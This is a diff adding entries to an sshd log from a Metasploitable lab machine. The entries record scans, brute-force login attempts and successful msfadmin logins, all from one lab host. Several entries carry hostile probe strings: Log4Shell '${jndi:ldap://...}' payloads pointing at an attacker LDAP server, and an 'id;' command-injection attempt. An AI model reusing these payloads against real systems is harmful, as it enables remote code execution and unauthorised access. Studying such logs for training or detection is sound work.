@@ -1,4 +1,61 @@
-
+Feb  9 09:11:38 metasploitable sshd[4749]: Did not receive identification string from 192.168.56.104
+Feb  9 09:12:51 metasploitable sshd[4787]: Did not receive identification string from 192.168.56.104
+Feb  9 09:27:50 metasploitable sshd[4850]: Did not receive identification string from 192.168.56.104
+Feb 10 09:13:22 metasploitable sshd[4738]: Did not receive identification string from 192.168.56.104
+Feb 10 09:13:51 metasploitable sshd[4770]: Did not receive identification string from 192.168.56.104
+Feb 10 09:26:04 metasploitable sshd[4830]: Did not receive identification string from 192.168.56.104
+Feb 10 09:29:25 metasploitable sshd[4958]: Did not receive identification string from 192.168.56.104
+Feb 14 01:40:30 metasploitable sshd[4767]: Bad protocol version identification '\026\003\001\002' from 192.168.56.104
+Feb 14 01:40:30 metasploitable sshd[4768]: Bad protocol version identification 'GET / HTTP/1.0' from 192.168.56.104
+Feb 14 01:41:52 metasploitable sshd[4808]: Did not receive identification string from 192.168.56.104
+Feb 14 01:45:27 metasploitable sshd[4998]: Did not receive identification string from 192.168.56.104
+Feb 14 01:47:32 metasploitable sshd[5076]: Bad protocol version identification '\026\003\001\003\245\001' from 192.168.56.104
+Feb 14 01:47:32 metasploitable sshd[5077]: Bad protocol version identification '\026\003\001\003\277\001' from 192.168.56.104
+Feb 14 01:47:32 metasploitable sshd[5078]: Bad protocol version identification '\026\003\002\003\245\001' from 192.168.56.104
+Feb 14 01:47:32 metasploitable sshd[5079]: Bad protocol version identification '\026\003\002\003\277\001' from 192.168.56.104
+Feb 14 01:47:32 metasploitable sshd[5080]: Bad protocol version identification '\026\003\003\003\313\001' from 192.168.56.104
+Feb 14 01:47:32 metasploitable sshd[5081]: Bad protocol version identification '\026\003\003\003\345\001' from 192.168.56.104
+Feb 14 01:47:32 metasploitable sshd[5082]: Bad protocol version identification '\026\003\003\003\302\001' from 192.168.56.104
+Feb 14 01:47:34 metasploitable sshd[5083]: Did not receive identification string from 192.168.56.104
+Feb 14 01:47:34 metasploitable sshd[5084]: Bad protocol version identification '\026\003' from 192.168.56.104
+Feb 14 01:47:41 metasploitable sshd[5093]: Protocol major versions differ for 192.168.56.104: SSH-2.0-OpenSSH_4.7p1 Debian-8ubuntu1 vs. SSH-0.12-OpenVASVTSSH_1.0
+Feb 14 01:47:41 metasploitable sshd[5094]: Protocol major versions differ for 192.168.56.104: SSH-2.0-OpenSSH_4.7p1 Debian-8ubuntu1 vs. SSH-1.33-OpenVASVTSSH_1.0
+Feb 14 01:47:41 metasploitable sshd[5095]: Protocol major versions differ for 192.168.56.104: SSH-2.0-OpenSSH_4.7p1 Debian-8ubuntu1 vs. SSH-1.5-OpenVASVTSSH_1.0
+Feb 14 01:47:41 metasploitable sshd[5102]: Did not receive identification string from 192.168.56.104
+Feb 17 09:44:22 metasploitable sshd[4884]: Did not receive identification string from 192.168.56.104
+Feb 17 12:41:04 metasploitable sshd[4796]: Bad protocol version identification '\026\003\001\002' from 192.168.56.104
+Feb 17 12:41:04 metasploitable sshd[4797]: Bad protocol version identification 'GET / HTTP/1.0' from 192.168.56.104
+Feb 17 12:45:52 metasploitable sshd[5003]: Did not receive identification string from 192.168.56.104
+Feb 17 12:47:35 metasploitable sshd[5067]: Protocol major versions differ for 192.168.56.104: SSH-2.0-OpenSSH_4.7p1 Debian-8ubuntu1 vs. SSH-0.12-OpenVASVTSSH_1.0
+Feb 17 12:47:35 metasploitable sshd[5068]: Protocol major versions differ for 192.168.56.104: SSH-2.0-OpenSSH_4.7p1 Debian-8ubuntu1 vs. SSH-1.33-OpenVASVTSSH_1.0
+Feb 17 12:47:35 metasploitable sshd[5069]: Protocol major versions differ for 192.168.56.104: SSH-2.0-OpenSSH_4.7p1 Debian-8ubuntu1 vs. SSH-1.5-OpenVASVTSSH_1.0
+Feb 17 12:47:35 metasploitable sshd[5076]: Did not receive identification string from 192.168.56.104
+Feb 17 12:47:56 metasploitable sshd[5086]: Bad protocol version identification '\026\003\001\003\245\001' from 192.168.56.104
+Feb 17 12:47:56 metasploitable sshd[5087]: Bad protocol version identification '\026\003\001\003\277\001' from 192.168.56.104
+Feb 17 12:47:56 metasploitable sshd[5088]: Bad protocol version identification '\026\003\002\003\245\001' from 192.168.56.104
+Feb 17 12:47:56 metasploitable sshd[5089]: Bad protocol version identification '\026\003\002\003\277\001' from 192.168.56.104
+Feb 17 12:47:56 metasploitable sshd[5090]: Bad protocol version identification '\026\003\003\003\313\001' from 192.168.56.104
+Feb 17 12:47:56 metasploitable sshd[5091]: Bad protocol version identification '\026\003\003\003\345\001' from 192.168.56.104
+Feb 17 12:47:56 metasploitable sshd[5092]: Bad protocol version identification '\026\003\003\003\302\001' from 192.168.56.104
+Feb 17 12:47:58 metasploitable sshd[5093]: Did not receive identification string from 192.168.56.104
+Feb 17 12:47:59 metasploitable sshd[5094]: Bad protocol version identification '\026\003' from 192.168.56.104
+Feb 17 13:20:14 metasploitable sshd[16518]: Bad protocol version identification 'id;' from 192.168.56.104
+Feb 17 13:26:25 metasploitable sshd[18894]: Bad protocol version identification '${jndi:ldap://192.168.56.104:10417/a}' from 192.168.56.104
+Feb 17 13:26:30 metasploitable sshd[19015]: Bad protocol version identification '${jndi:ldap://kali:10417/a}' from 192.168.56.104
+Feb 17 13:26:35 metasploitable sshd[19221]: Bad protocol version identification '${jndi:ldap://127.0.0.1#192.168.56.104:10417/a}' from 192.168.56.104
+Feb 17 13:26:40 metasploitable sshd[19445]: Bad protocol version identification '${jndi:ldap://127.0.0.1#kali:10417/a}' from 192.168.56.104
+Feb 17 13:26:45 metasploitable sshd[19575]: Bad protocol version identification '${jndi:ldap://localhost#192.168.56.104:10417/a}' from 192.168.56.104
+Feb 17 13:26:50 metasploitable sshd[19689]: Bad protocol version identification '${jndi:ldap://localhost#kali:10417/a}' from 192.168.56.104
+Feb 17 13:32:03 metasploitable sshd[27343]: Did not receive identification string from 192.168.56.104
+Feb 19 04:43:35 metasploitable sshd[4723]: Did not receive identification string from 192.168.56.104
+Feb 19 04:51:03 metasploitable sshd[4776]: Did not receive identification string from 192.168.56.104
+Feb 19 05:12:53 metasploitable sshd[4871]: Did not receive identification string from 192.168.56.104
+Feb 19 05:14:31 metasploitable sshd[4968]: Protocol major versions differ for 192.168.56.104: SSH-2.0-OpenSSH_4.7p1 Debian-8ubuntu1 vs. SSH-1.5-NmapNSE_1.0
+Feb 19 05:14:31 metasploitable sshd[4969]: Protocol major versions differ for 192.168.56.104: SSH-2.0-OpenSSH_4.7p1 Debian-8ubuntu1 vs. SSH-1.5-Nmap-SSH1-Hostkey
+Feb 19 05:30:24 metasploitable sshd[5088]: Did not receive identification string from 192.168.56.104
+Feb 19 05:32:00 metasploitable sshd[5141]: Protocol major versions differ for 192.168.56.104: SSH-2.0-OpenSSH_4.7p1 Debian-8ubuntu1 vs. SSH-1.5-Nmap-SSH1-Hostkey
+Feb 19 05:32:02 metasploitable sshd[5157]: Protocol major versions differ for 192.168.56.104: SSH-2.0-OpenSSH_4.7p1 Debian-8ubuntu1 vs. SSH-1.5-NmapNSE_1.0
+Feb 19 05:51:51 metasploitable sshd[5472]: Bad protocol version identification '\026\003' from 192.168.56.104
 Apr 14 06:40:27 metasploitable sshd[5772]: Did not receive identification string from 192.168.56.104
 Apr 14 08:34:53 metasploitable sshd[6068]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=192.168.56.104  user=msfadmin
 Apr 14 08:34:55 metasploitable sshd[6068]: Failed password for msfadmin from 192.168.56.104 port 55666 ssh2
@@ -32732,3 +32789,9 @@ Apr 14 10:16:46 metasploitable sshd[12940]: Did not receive identification strin
 Apr 14 10:16:46 metasploitable sshd[12941]: Did not receive identification string from 192.168.56.104
 Apr 14 10:16:46 metasploitable sshd[12942]: Did not receive identification string from 192.168.56.104
 Apr 14 10:16:47 metasploitable sshd[12922]: Failed password for msfadmin from 192.168.56.104 port 47450 ssh2
+Apr 14 10:06:48 metasploitable sshd[12860]: Accepted password for msfadmin from 192.168.56.104 port 52732 ssh2
+Apr 14 10:16:02 metasploitable sshd[12917]: Accepted password for msfadmin from 192.168.56.104 port 59110 ssh2
+Apr 14 10:16:46 metasploitable sshd[12920]: Accepted password for msfadmin from 192.168.56.104 port 58836 ssh2
+Apr 14 11:51:01 metasploitable sshd[13208]: Accepted password for msfadmin from 192.168.56.104 port 53022 ssh2
+Apr 14 11:55:10 metasploitable sshd[13222]: Accepted password for msfadmin from 192.168.56.104 port 42158 ssh2
+Apr 14 11:58:30 metasploitable sshd[13237]: Accepted password for msfadmin from 192.168.56.104 port 40458 ssh2
